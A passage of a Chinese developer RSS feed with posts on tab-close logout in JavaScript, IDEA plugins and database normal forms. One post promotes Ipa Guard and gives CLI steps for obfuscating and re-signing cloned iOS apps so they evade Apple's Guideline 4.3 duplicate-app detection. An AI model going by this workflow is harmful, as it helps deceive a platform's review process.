<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FAPI%2FWindow%2Fbeforeunload_event" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/beforeunload_event" ref="nofollow noopener noreferrer">beforeunload 事件</a>在页面刷新时也会触发，而排除是刷新的情况 试了N种方案都不尽人意</li>
<li>标签页关闭后axios触发的登出请求 会被浏览器取消，后端接收不到。</li>
</ol>
<p>折腾一波后，最终都解决了，这里记录下解决方案。</p>
<h2 data-id="heading-1">二、解决方案</h2>
<h3 data-id="heading-2">2.1 标签页关闭时登出，但排除刷新的场景</h3>
<p>在<code>unload</code>事件中增加刷新情况的判断。除了下面代码中时间差的判断方法外，还尝试过<code>performance.navigation</code>等方案，都无效。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> _beforeUnload_time = <span class="hljs-number">0</span>
<span class="hljs-keyword">let</span> _gap_time = <span class="hljs-number">0</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-property">onbeforeunload</span> = <span class="hljs-function">() =&gt;</span> {
  _beforeUnload_time = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>();
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"beforeUnload_time"</span>, _beforeUnload_time);
};

<span class="hljs-variable language_">window</span>.<span class="hljs-property">onunload</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
  _gap_time = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>() - _beforeUnload_time;
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"gap_time"</span>, _gap_time);
<span class="hljs-keyword">if</span> (_gap_time &lt;= <span class="hljs-number">5</span> || event.<span class="hljs-property">altKey</span>) {
    <span class="hljs-comment">// 执行关闭需要进行的操作，1. 清除本地缓存；2. 发送登出接口</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"xxxxxxx关闭"</span>);
  }<span class="hljs-keyword">else</span>{
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"页面刷新"</span>);
  }
};
</code></pre>
<h3 data-id="heading-3">2.2 登出请求，避免被浏览器取消</h3>
<p>Fetch的keepalive可以在页面卸载（如用户关闭标签页或跳转到新页面）后，确保请求仍能在后台完成的选项</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">'/api/logout'</span>, {
  <span class="hljs-attr">method</span>: <span class="hljs-string">'GET'</span>,
  <span class="hljs-attr">headers</span>: {
    <span class="hljs-string">'Authorization'</span>: token
  },
  <span class="hljs-attr">keepalive</span>: <span class="hljs-literal">true</span>, // 类似 sendBeacon 的行为
});
</code></pre>
<h3 data-id="heading-4">2.3 浏览器关闭再进入的场景</h3>
<p>基于sessionStorage做判断，存储在 <code>sessionStorage</code> 里面的数据在页面会话结束时会被浏览器自动清除。</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 初次进入跳转登录页面</span>
<span class="hljs-keyword">if</span> (!sessionStorage.<span class="hljs-built_in">getItem</span>(<span class="hljs-string">"entered"</span>)) {
  location.hash = <span class="hljs-string">"#/login"</span>;
  sessionStorage.<span class="hljs-built_in">setItem</span>(<span class="hljs-string">"entered"</span>, <span class="hljs-string">"true"</span>);
}
</code></pre>
<h2 data-id="heading-5">三、参考资料</h2>
<ul>
<li><a href="https://juejin.cn/post/7356138322368184358" target="_blank" title="https://juejin.cn/post/7356138322368184358">chrome 判断当前是关闭浏览器还是刷新浏览器</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FAPI%2FNavigator%2FsendBeacon" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/API/Navigator/sendBeacon" ref="nofollow noopener noreferrer">Navigator.sendBeacon()</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[IDEA插件]]></title>    <link>https://juejin.cn/post/7584013833993928738</link>    <guid>https://juejin.cn/post/7584013833993928738</guid>    <pubDate>2025-12-16T07:20:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584013833993928738" data-draft-id="7584013833993879586" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="IDEA插件"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-12-16T07:20:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="无名之辈J"/> <meta itemprop="url" content="https://juejin.cn/user/3672818779437239"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            IDEA插件
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3672818779437239/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    无名之辈J
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:20:24.000Z" title="Tue Dec 16 2025 07:20:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、GenerateAllSetter</h2>
<p>GenerateAllSetter 有助于为类中的所有属性生成 setter 方法。这可以在编写代码时节省时间和精力，同时也降低了出错的可能性。</p>
<h2 data-id="heading-1">二、Lombok</h2>
<p>Lombok：一个自动生成样板代码的 Java 库。</p>
<h2 data-id="heading-2">三、translation</h2>
<p>对于英文不太好的同学是一个非常不错的工具，不用再将单词复制到单独的翻译工具。当然对于生僻的单词更是克星!</p>
<h2 data-id="heading-3">四、MyBatisX</h2>
<p>Mybatis作为常用的ORM框架，受众还是非常广的，MyBatisX插件是一款辅助 IDEA 快速开发 MyBatis 的插件，能快帮你快速的定位到某个Mapper方法中对应的SQL是哪个。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[使用 Ipa Guard 应对 App Store 4.3 风险的一些实践]]></title>    <link>https://juejin.cn/post/7584307642983514153</link>    <guid>https://juejin.cn/post/7584307642983514153</guid>    <pubDate>2025-12-16T07:24:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584307642983514153" data-draft-id="7584059298696249385" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="使用 Ipa Guard 应对 App Store 4.3 风险的一些实践"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-16T07:24:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="开心就好2025"/> <meta itemprop="url" content="https://juejin.cn/user/3850962908492660"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            使用 Ipa Guard 应对 App Store 4.3 风险的一些实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3850962908492660/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    开心就好2025
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:24:02.000Z" title="Tue Dec 16 2025 07:24:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 iOS 上架过程中，<strong>Guideline 4.3（Spam / 重复应用）</strong> 是很多团队反复踩中的问题，尤其集中在以下场景：</p>
<ul>
<li>多马甲 / 多地区版本</li>
<li>定制化交付的行业 App</li>
<li>白标（White-label）项目</li>
<li>同一代码基线的多客户版本</li>
<li>渠道包 / 联运包</li>
<li>外包项目统一模板交付</li>
</ul>
<p>需要明确的是：
<strong>4.3 并不是“代码违规”，而是“应用之间相似度过高”带来的审核风险。</strong>
因此，规避 4.3 的核心目标不是“隐藏代码”，而是<strong>在技术层面降低应用之间的可识别相似性</strong>。</p>
<p>本文从审核判定逻辑出发，结合工程实践，说明如何通过 <strong>Ipa Guard</strong> 配合其他工具，在不改动或尽量少改源码的前提下，<strong>降低被判定为重复应用的概率</strong>。</p>
<hr/>
<h2 data-id="heading-0">一、4.3 审核的本质：Apple 在比对什么？</h2>
<p>从大量被拒案例总结，4.3 通常并不只看 UI，而是综合多个维度：</p>
<h3 data-id="heading-1">常见判定信号包括（并非公开标准）：</h3>
<ul>
<li>二进制结构高度一致</li>
<li>类名 / 方法名 / 符号结构高度相似</li>
<li>资源文件结构、命名高度一致</li>
<li>H5 / JS 逻辑一致</li>
<li>包体结构、Framework 组合一致</li>
<li>启动流程、功能路径一致</li>
</ul>
<p>也就是说，即使你：</p>
<ul>
<li>换了图标</li>
<li>换了名称</li>
<li>换了文案</li>
</ul>
<p>如果 <strong>IPA 内部结构高度一致</strong>，仍然可能触发 4.3。</p>
<hr/>
<h2 data-id="heading-2">二、为什么“只改 UI / 文案”对 4.3 帮助有限？</h2>
<p>从工程角度看，很多团队规避 4.3 的手段集中在表层：</p>
<ul>
<li>换配色</li>
<li>换 logo</li>
<li>换应用名</li>
<li>换描述</li>
</ul>
<p>但在 IPA 结构层面，以下内容往往保持完全一致：</p>
<ul>
<li>Swift / ObjC 类名</li>
<li>方法签名</li>
<li>Framework 顺序</li>
<li>JSON / H5 文件结构</li>
<li>资源路径</li>
<li>MD5 特征</li>
</ul>
<p>这些恰恰是<strong>机器最容易比对的部分</strong>。</p>
<p>因此，真正有效的策略是：</p>
<blockquote>
<p><strong>在不影响功能的前提下，让每个 IPA 在“内部结构层面”产生差异。</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-3">三、规避 4.3 的技术目标拆解</h2>
<p>不谈“保证通过”，只谈<strong>降低风险</strong>，可拆解为四个目标：</p>
<ol>
<li><strong>降低二进制结构相似度</strong></li>
<li><strong>降低符号层相似度</strong></li>
<li><strong>降低资源结构相似度</strong></li>
<li><strong>让每个包具备独立可识别特征</strong></li>
</ol>
<p>这四点，正是 IPA 层处理工具能发挥作用的地方。</p>
<hr/>
<h2 data-id="heading-4">四、Ipa Guard 在规避 4.3 中承担的角色</h2>
<p>需要强调：
<strong>Ipa Guard 不是审核工具，也不是绕审工具。</strong>
它的作用是：<strong>在工程层面制造“合理差异”</strong>。</p>
<h3 data-id="heading-5">Ipa Guard 的适配点在于：</h3>
<ul>
<li>无需 iOS App 源码</li>
<li>直接作用于已编译的 IPA</li>
<li>可对每个包执行不同处理</li>
<li>支持自动化批量处理</li>
</ul>
<p>这使它非常适合以下场景：</p>
<ul>
<li>多客户定制</li>
<li>行业模板应用</li>
<li>多地区发行</li>
<li>联运 / 渠道包</li>
</ul>
<hr/>
<h2 data-id="heading-6">五、从工程角度看：Ipa Guard 能改变哪些相似度</h2>
<h3 data-id="heading-7">符号层差异（Swift / ObjC）</h3>
<p>通过 IPA 级混淆，可以让：</p>
<ul>
<li>类名</li>
<li>方法名</li>
<li>变量名</li>
</ul>
<p>在不同包中产生<strong>完全不同的映射结果</strong>。</p>
<p>即使源码相同，最终 IPA 中的符号结构也会不同。</p>
<hr/>
<h3 data-id="heading-8">资源结构差异（非常关键）</h3>
<p>Ipa Guard 可对以下资源进行处理：</p>
<ul>
<li>JSON</li>
<li>H5 / JS</li>
<li>图片</li>
<li>配置文件</li>
</ul>
<p>处理方式包括：</p>
<ul>
<li>文件名重写</li>
<li>路径扰动</li>
<li>MD5 修改</li>
</ul>
<p>结果是：
<strong>两个功能完全一致的 App，在资源结构层面已不再一致。</strong></p>
<hr/>
<h3 data-id="heading-9">包体内部指纹差异</h3>
<p>当：</p>
<ul>
<li>符号映射不同</li>
<li>资源路径不同</li>
<li>MD5 不同</li>
</ul>
<p>那么包体的整体指纹也会随之变化，这对降低“模板化识别”非常重要。</p>
<hr/>
<h2 data-id="heading-10">六、典型的“规避 4.3”工程流程（信息密集版）</h2>
<p>以下流程以 <strong>不改源码或最小改动源码</strong> 为前提。</p>
<hr/>
<h3 data-id="heading-11">Step 1：生成基础 IPA（同一代码基线）</h3>
<p>每个客户 / 版本生成一个基础 IPA。</p>
<hr/>
<h3 data-id="heading-12">Step 2：解析 IPA 结构</h3>
<pre><code class="hljs language-bash" lang="bash">ipaguard_cli parse base.ipa -o sym.json
</code></pre>
<p>目的：</p>
<ul>
<li>获取符号与资源清单</li>
<li>为后续差异化处理提供依据</li>
</ul>
<hr/>
<h3 data-id="heading-13">Step 3：为每个 App 生成独立混淆策略</h3>
<p>常见做法：</p>
<ul>
<li>每个包使用不同的随机种子</li>
<li>不同客户启用不同混淆组合</li>
<li>对资源改名顺序进行差异化</li>
<li>保留必要的 SDK / Bridge 符号</li>
</ul>
<hr/>
<h3 data-id="heading-14">Step 4：执行 IPA 层差异化处理</h3>
<pre><code class="hljs language-bash" lang="bash">ipaguard_cli protect base.ipa \
  -c sym.json \
  --js \
  --image \
  -o clientA.ipa
</code></pre>
<p>对 clientB / clientC 使用不同策略重复执行。</p>
<hr/>
<h3 data-id="heading-15">Step 5：重签与真机测试</h3>
<pre><code class="hljs language-bash" lang="bash">kxsign sign clientA.ipa \
  -c cert.p12 \
  -p password \
  -m distribution.mobileprovision \
  -z finalA.ipa
</code></pre>
<p>确保功能一致、行为一致。</p>
<hr/>
<h2 data-id="heading-16">七、Ipa Guard 需要与哪些工具配合，效果才更稳定</h2>
<p>规避 4.3 <strong>不是单点工具问题</strong>，而是组合问题。</p>
<h3 data-id="heading-17">推荐组合如下：</h3>
<hr/>
<h3 data-id="heading-18">源码层（可选，但有帮助）</h3>
<ul>
<li>Swift Shield（Swift 项目）</li>
<li>不同包启用不同编译宏</li>
<li>少量功能差异开关</li>
</ul>
<p>目的：
制造“逻辑层差异”。</p>
<hr/>
<h3 data-id="heading-19">IPA 层（核心）</h3>
<ul>
<li><strong>Ipa Guard</strong>
<ul>
<li>符号差异化</li>
<li>资源结构差异化</li>
<li>包体指纹变化</li>
</ul>
</li>
</ul>
<p>这是降低 4.3 风险的核心技术层。</p>
<hr/>
<h3 data-id="heading-20">H5 / Hybrid 层（如存在）</h3>
<ul>
<li>JS 混淆</li>
<li>不同包注入不同资源结构</li>
</ul>
<hr/>
<h3 data-id="heading-21">发布层</h3>
<ul>
<li>不同 Bundle ID</li>
<li>不同应用描述与截图</li>
<li>不同审核节奏</li>
</ul>
<hr/>
<h2 data-id="heading-22">八、哪些场景下“IPA 层差异化”尤其重要？</h2>
<p>从经验看，以下场景如果<strong>不做 IPA 层处理</strong>，4.3 风险非常高：</p>
<ul>
<li>行业 SaaS 模板（餐饮 / 教育 / 医疗）</li>
<li>同城 / 门店类应用</li>
<li>政企定制项目</li>
<li>多地区多语言版本</li>
<li>游戏联运壳</li>
</ul>
<p>这些项目即使 UI 不同，也很容易在结构层面被识别为“同类应用”。</p>
<hr/>
<h2 data-id="heading-23">九、关于 4.3 的几个重要认知提醒</h2>
<ul>
<li>不存在 100% 规避 4.3 的技术方案</li>
<li>混淆 ≠ 欺骗审核</li>
<li>只改 UI 远远不够</li>
</ul>
<p>但可以明确的是：</p>
<blockquote>
<p><strong>在合规前提下，通过工程手段降低相似度，是目前最现实、最被团队采用的做法。</strong></p>
</blockquote>
<p>Ipa Guard 在这里扮演的是 <strong>“差异化工具”</strong>，而不是“绕审工具”。</p>
<hr/>
<h2 data-id="heading-24">用理性思维看待 4.3，而不是侥幸心理</h2>
<p>从工程角度总结，规避 4.3 的关键在于：</p>
<ul>
<li>不依赖人工修改</li>
<li>不破坏功能</li>
<li>可批量、可复用</li>
<li>每个 IPA 都具备独立结构特征</li>
</ul>
<p>而 <strong>Ipa Guard + 多工具组合</strong> 的价值在于：</p>
<ul>
<li>不改源码也能制造结构差异</li>
<li>适合规模化交付</li>
<li>可接入 CI/CD</li>
<li>成本可控、稳定性高</li>
</ul>
<hr/>
<h3 data-id="heading-25">推荐的工具分工结构（简表）</h3>





























<table><thead><tr><th>层级</th><th>工具</th></tr></thead><tbody><tr><td>源码层（可选）</td><td>Swift Shield / 编译宏</td></tr><tr><td>IPA 层（核心）</td><td>Ipa Guard CLI</td></tr><tr><td>H5 / JS 层</td><td>JS 混淆工具</td></tr><tr><td>签名验证</td><td>kxsign</td></tr><tr><td>发布层</td><td>元数据差异化</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一站式了解数据库三大范式(库表设计基础)]]></title>    <link>https://juejin.cn/post/7584028251167440923</link>    <guid>https://juejin.cn/post/7584028251167440923</guid>    <pubDate>2025-12-16T07:21:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584028251167440923" data-draft-id="7583983152324657178" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一站式了解数据库三大范式(库表设计基础)"/> <meta itemprop="keywords" content="后端,数据库,面试"/> <meta itemprop="datePublished" content="2025-12-16T07:21:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="想用offer打牌"/> <meta itemprop="url" content="https://juejin.cn/user/578781641968972"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" 